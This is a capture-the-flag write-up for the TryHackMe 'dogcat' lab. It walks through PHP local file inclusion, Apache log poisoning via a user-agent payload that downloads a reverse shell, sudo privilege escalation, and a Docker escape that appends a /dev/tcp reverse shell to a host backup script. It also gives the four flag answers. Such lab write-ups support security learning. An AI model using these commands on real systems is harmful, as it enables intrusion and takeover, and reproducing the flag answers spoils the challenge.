# dogcat
https://tryhackme.com/room/dogcat

> I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

> export target=10.10.78.42

## What is flag 1?
There's a website on the IP that has a selection of "a dog" or "a cat" which return the following
- http://10.10.78.42/?view=dog
- http://10.10.78.42/?view=cat

I mess around with this and check for a local file inclusion by changing the view parameter to
_../../../../etc/passwd_: which doesn't give me any hints on LFI, however if I set it to _dog/../../../test_ the query goes through correctly.

```
Warning: include(dog/../../../.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog/../../../.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

Due to the above output from the website I assume that either "cat" or "dog" must be contained within the parameter along with the fact that LFI is available however it appends ".php" to the end of our param value. I also found that the docroot for the server is _/var/www/html/_

I then researched LFI and how to attempt to view the php source behind the input and found this:
https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter

I then changed the value to the aprameter to 
`php://filter/read=convert.base64-encode/resource=./dog/../index`

This gave me a base64 string containing the php source code of the website.

I saved this to a file and converted it using `base64 -d base64.txt > index.html`

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```

In the code above I'm able to bypass the extension being added by setting an empty value under the "ext" param. I can also bypass the filter checking if dog has been set by starting the value with _./dog/_

Therefore if I want to view a file in the / directory I do the following:
`?view=./dog/../../../<dir/file>&ext=`
 
This works because from the /var/www/html/ directory ../../../ takes the context to /

Earlier we saw that the web server is using apache2 (nmap port scan) so we're going to try to view the access logs.

`?view=./dog/../../../../../../../var/log/apache2/access.log&ext`

The output from this shows the logs as the following:
```
127.0.0.1 - - [18/Oct/2021:16:12:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
[my IP address] - - [18/Oct/2021:16:13:33 +0000] "GET /?view=./dog/../../var/log/apache2/access.log&ext HTTP/1.1" 200 714 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Since we can render this log file and the user-agent is written to it we can perform some log poisoning to gain a shell on the web server.

To do this I used pentestmonkey's reverse php shell, which I called "shell.php". This is the file I will try and upload to the server.

Then I used curl to inject php script into the user-agent field on the apache logs using the below command:  
`curl http://10.10.78.42/\?view\=./dog/../../../../../../../var/log/apache2/access.log\&ext -A "<?php file_put_contents('shell.php', file_get_contents('http://<my ip>:10000/shell.php'))?>"`

From here I started a python web server on my machine using `python3 -m http.server 10000 --bind [my ip]` and then refresh the page to upload my file to the server.

I then start a netcat listener and navigate to /shell.php on the server to run the reverse shell.

After establishing a reverse shell connection I then used the `find` command to look for files containing the string "flag" within their filename.

I found the following:
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt

Answer: THM{Th1s_1s_N0t_4_Catdog_ab67edfa}

## What is flag 2?
This flag was contained within the /var/www/flag2_QMW7JvaY2LvK.txt file on the server
Answer: THM{LF1_t0_RC3_aec3fb}

## What is flag 3?
I checked what sudo privs I had on the www-data user and found the below
`$ sudo -l # (root) NOPASSWD: /usr/bin/env`

gtfobins: https://gtfobins.github.io/gtfobins/env/#sudo

I ran `sudo /usr/bin/env /bin/sh` which gave me access to the root user and there was a flag3.txt file within the /root directory which contained the third flag.

Answer: THM{D1ff3r3nt_3nv1ronments_874112}

## What is flag 4?
I wasn't able to find any more files on the machine so I decided to check if it was containerized by checking `/proc/1/cgroup`

`cat /proc/1/cgroup` -  
```
12:memory:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
11:cpuset:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
10:perf_event:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
9:net_cls,net_prio:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
8:blkio:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
7:freezer:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
6:rdma:/
5:pids:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
4:cpu,cpuacct:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
3:devices:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
2:hugetlb:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
1:name=systemd:/docker/6f1cb33f178163ce51a5b6c550765332853c55f1d295cd30b5a53a7683810ee8
```

Normally we'd see / instead of /docker/ if this was a normal machine. Also, as this says /docker/ we can assume that we are within a docker container so we sould try to escape a docker container. You can also tell by running `hostname` and looking for a container name  / label.

I needed some help here so I used linpeas from my machine and ran it to help me with some further enumeration.

linpeas has found the following information that I believed to be useful:

```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/opt/backups/backup.tar

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2949120 Oct 18 17:07 /opt/backups/backup.tar
-rwxr--r-- 1 root root 69 Mar 10  2020 /opt/backups/backup.sh

```

As the /opt/backups/backup.tar file was modified within the last 5 minutes I can assume that there is a script running that modifies this file, then there's also a shell script /opt/backups/backup.sh which runs the following:

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

The /root/container directory doesn't exist on this machine therefore I am making a assumption that this script is running on the root user on the host machine and not within the container.

Checking the files contained within backup.tar the launch script mounts /root/container/backup from the host machine to /opt/backups within the container.

Also, since these are bash scripts and they're not being ran within the container I can assume that the host is a linux machine. Therefore I will use bash to establish a reverse shell as I don't know what else is available on the host.

`sh -i >& /dev/tcp/10.9.180.40/4242 0>&1`

I added this to the end of the backup script using echo `echo "sh -i >& /dev/tcp/10.9.180.40/4242 0>&1" >> backup.sh` then started a netcat listener using `nc -lvnp 4242` and waited for the script to be ran again.

I was correct on my assumptions of it being a Linux machine and that docker was running on the root user.

I was able to find the final flag in /root/flag4.txt on the host machine.

Answer: THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
